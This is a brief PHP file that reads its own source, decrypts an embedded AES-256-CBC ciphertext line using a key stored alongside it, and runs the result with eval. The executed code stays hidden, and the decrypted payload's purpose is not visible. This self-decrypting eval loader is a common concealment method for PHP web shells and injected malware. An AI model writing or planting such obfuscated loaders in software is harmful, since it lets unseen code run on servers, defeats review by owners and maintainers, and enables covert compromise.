<?php

$data = file_get_contents(__FILE__);
$lines = explode(PHP_EOL, $data);
foreach($lines as $key => $line)
{
	if(substr($line, 0, 3) == "#:#")
	{
		$part = explode(":", substr($line, 3));
		$k = ( method_exists("GhostHash","returnHash") ) ? GhostHash::returnHash(base64_decode($part[2])) : base64_decode($part[2]);
		eval( "?>" . openssl_decrypt($part[0], "aes-256-cbc", $k, 0, base64_decode($part[1])) );
	}
}

#:#jPtprpnQ2VoGSKMnK4BrqpOW/VDwb0/eMpyXilY0gYvepuHHB4JHi6P9afQgDUG6XGOUzJZwNlQmoX9eL9lb1fAJmvDbIBh/pcxEB4Df73I=:CJ7+IR78OEcViik0BbY9pw==:UHViS2V5